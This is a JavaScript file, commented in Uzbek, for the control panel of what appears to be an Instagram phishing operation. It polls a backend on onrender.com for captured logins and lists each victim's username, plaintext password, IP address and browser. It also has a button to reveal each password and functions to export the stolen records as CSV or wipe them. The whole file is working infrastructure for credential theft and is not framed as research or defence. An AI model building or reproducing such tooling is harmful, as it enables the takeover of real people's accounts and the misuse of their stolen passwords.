document.addEventListener('DOMContentLoaded', function() {
    // Backend URL ni aniq belgilash
    const backendUrl = 'https://instagram-ek8i.onrender.com';
    let updateCounter = 0;
    let allLogs = [];
    
    console.log('Dashboard loaded, backend URL:', backendUrl);

    async function loadLogs() {
        try {
            // Loading holatini ko'rsatish
            document.getElementById('backendStatus').innerHTML = 
                `<i class="fas fa-circle-notch fa-spin"></i> Yuklanmoqda...`;
            
            console.log('Fetching logs from:', `${backendUrl}/logs`);
            
            const response = await fetch(`${backendUrl}/logs`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                },
                mode: 'cors'
            });

            console.log('Response status:', response.status);
            
            if (!response.ok) {
                throw new Error(`Server xatosi: ${response.status} ${response.statusText}`);
            }

            const data = await response.json();
            console.log('Logs data received:', data);

            // Status ko'rsatish
            document.getElementById('backendStatus').innerHTML =
                `<i class="fas fa-check-circle" style="color:#10b981"></i> Online`;

            // Statistikani yangilash
            document.getElementById('totalRecords').textContent = data.total || 0;
            document.getElementById('todayRecords').textContent = data.today || 0;

            if (data.last) {
                try {
                    const lastDate = new Date(data.last);
                    const hours = lastDate.getHours().toString().padStart(2, '0');
                    const minutes = lastDate.getMinutes().toString().padStart(2, '0');
                    document.getElementById('lastRecord').textContent = `${hours}:${minutes}`;
                } catch (e) {
                    document.getElementById('lastRecord').textContent = data.last || '--:--';
                }
            }

            document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('uz-UZ');

            // Jadvalni yangilash
            const tbody = document.getElementById('logsBody');
            tbody.innerHTML = '';

            if (data.logs && data.logs.length > 0) {
                allLogs = data.logs;
                data.logs.forEach(log => {
                    const row = tbody.insertRow();
                    const time = new Date(log.timestamp);
                    
                    row.innerHTML = `
                        <td>${log.id}</td>
                        <td><strong>${log.username}</strong></td>
                        <td class="password-cell">
                            <span class="password-display">${'•'.repeat(log.password.length)}</span>
                            <button onclick="togglePassword(this, '${log.password.replace(/'/g, "\\'")}')" 
                                    style="margin-left: 10px; background: none; border: 1px solid #334155; color: #94a3b8; padding: 2px 8px; border-radius: 4px; cursor: pointer;">
                                <i class="fas fa-eye"></i>
                            </button>
                        </td>
                        <td>${time.toLocaleString('uz-UZ')}</td>
                        <td>${log.ip_address || 'N/A'}</td>
                        <td title="${log.user_agent}">${log.user_agent?.substring(0, 40)}...</td>
                    `;
                });
            } else {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:40px;">Hozircha ma\'lumot yo\'q</td></tr>';
                allLogs = [];
            }

            // Yangilash sonini hisoblash
            updateCounter++;
            document.getElementById('updateTime').textContent = updateCounter;

        } catch (error) {
            console.error('Xatolik:', error);
            document.getElementById('backendStatus').innerHTML =
                `<i class="fas fa-times-circle" style="color:#ef4444"></i> Offline`;
            document.getElementById('logsBody').innerHTML = 
                `<tr>
                    <td colspan="6" style="text-align:center;padding:40px;color:#ef4444">
                        <i class="fas fa-exclamation-triangle"></i><br>
                        Serverga ulanmadi<br>
                        <small>${error.message}</small>
                    </td>
                </tr>`;
            
            // 10 soniyadan keyin qayta urinish
            setTimeout(loadLogs, 10000);
        }
    }

    // Global funksiyalar
    window.togglePassword = function(button, realPassword) {
        const passwordSpan = button.parentElement.querySelector('.password-display');
        const icon = button.querySelector('i');
        
        if (passwordSpan.textContent.includes('•')) {
            passwordSpan.textContent = realPassword;
            icon.className = 'fas fa-eye-slash';
        } else {
            passwordSpan.textContent = '•'.repeat(realPassword.length);
            icon.className = 'fas fa-eye';
        }
    };

    window.exportCSV = async function() {
        try {
            const response = await fetch(`${backendUrl}/export_csv`, {
                method: 'GET',
                mode: 'cors'
            });
            
            if (!response.ok) {
                throw new Error('Export failed');
            }
            
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `instagram_logs_${new Date().toISOString().split('T')[0]}.csv`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            
            alert('CSV fayli yuklab olindi!');
        } catch (error) {
            console.error('Export error:', error);
            alert('Exportda xatolik!');
        }
    };

    window.clearLogs = async function() {
        if (!confirm('ROSTAN HAM barcha loglarni o\'chirmoqchimisiz?\nBu amalni qaytarib bo\'lmaydi!')) {
            return;
        }
        
        try {
            const adminToken = prompt('Admin token kiriting (agar sozlangan bo\'lsa):') || '';
            
            const response = await fetch(`${backendUrl}/clear_logs`, {
                method: 'DELETE',
                headers: {
                    'Authorization': adminToken ? `Bearer ${adminToken}` : '',
                    'Content-Type': 'application/json'
                },
                mode: 'cors'
            });
            
            if (response.ok) {
                const result = await response.json();
                alert(result.message || 'Barcha loglar o\'chirildi!');
                loadLogs(); // Yangilash
            } else if (response.status === 401) {
                alert('Ruxsat yo\'q! Admin token kerak.');
            } else {
                throw new Error('Clear failed');
            }
        } catch (error) {
            console.error('Clear error:', error);
            alert('O\'chirishda xatolik!');
        }
    };

    // Dastlabki yuklash
    loadLogs();
    
    // Har 5 soniyada yangilash
    setInterval(() => {
        loadLogs();
        updateCounter++;
        document.getElementById('updateTime').textContent = updateCounter;
    }, 5000);
    
    // Vaqtni real-time yangilash
    setInterval(() => {
        document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('uz-UZ');
    }, 1000);
});